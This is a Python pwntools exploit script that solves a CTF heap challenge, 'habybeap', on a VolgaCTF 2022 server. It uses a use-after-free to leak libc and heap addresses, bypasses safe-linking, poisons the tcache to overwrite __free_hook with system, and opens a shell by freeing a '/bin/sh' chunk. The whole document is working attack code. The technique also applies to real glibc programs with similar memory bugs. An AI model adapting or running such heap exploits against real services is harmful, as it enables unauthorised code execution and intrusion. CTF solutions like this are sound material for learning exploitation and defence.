#!/usr/bin/env python3

from pwn import *

exe = ELF("./habybeap_patched")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6")
ld = ELF("./ld.so")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

r = None

def conn():
    global r
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
            pie break 0x155a
            pie break 0x15fd
            pie break 0x14b6
            c
            """)
    else:
        r = remote("habybeap.q.2022.volgactf.ru", 21337)


def add_note(idx, data, big=False, newline=True):
    r.sendlineafter(b"Input your choice>>", b"1")
    r.sendlineafter(b"Input your index>>", str(idx).encode())
    r.sendlineafter(b"1 for big, 0 for smol >>", b"1" if big else b"0")
    if newline:
        r.sendlineafter(b"Input your data>>", data)
    else:
        r.sendafter(b"Input your data>>", data)

def edit_note(idx, data, newline=True):
    r.sendlineafter(b"Input your choice>>", b"2")
    r.sendlineafter(b"Input your index>>", str(idx).encode())
    if newline:
        r.sendlineafter(b"Input your data>>", data)
    else:
        r.sendafter(b"Input your data>>", data)

def print_note(idx):
    r.sendlineafter(b"Input your choice>>", b"4")
    r.sendlineafter(b"Input your index>>", str(idx).encode())
    return r.recvuntil(b"[1] Add note")[:-len("[1] Add note")]

def delete_note(idx):
    r.sendlineafter(b"Input your choice>>", b"3")
    r.sendlineafter(b"Input your index>>", str(idx).encode())

def main():
    conn()
    for i in range(7):
        add_note(i, b"HELLO", big=True)
    add_note(7, b"prev", big=True)
    add_note(8, b"a", big=True)
    add_note(9, b"small")

    for i in range(7):
        delete_note(i)
    
    delete_note(8)
    delete_note(7)
    print_note(8)
    add_note(10, b"AAAA", big=True)
    delete_note(8)
    add_note(11, b"A"*0x70)
    unsorted_leak = u64(b"\x00" + print_note(7)[0x72:-1] + b"\x00"*2)
    heap_leak = u64(print_note(0)[1:-1] + b"\x00"*3)
    libc_leak = unsorted_leak - 0x1e0c00
    libc.address = libc_leak
    print(f"LIBC LEAK: {hex(libc_leak)}")
    print(f"SYSTEM: {hex(libc.sym['system'])}")
    print(f"FREE HOOK: {hex(libc.sym['__free_hook'])}")
    print(f"HEAP KEY: {hex(heap_leak)}")

    edit_note(5, p64(libc.sym['__free_hook'] ^ heap_leak)[:6], newline=False)
    add_note(13, b"/bin/sh\x00", big=True)
    add_note(14, b"TEST", big=True)
    add_note(15, p64(libc.sym["system"]), big=True)
    delete_note(13)
    r.interactive()



if __name__ == '__main__':
    main()
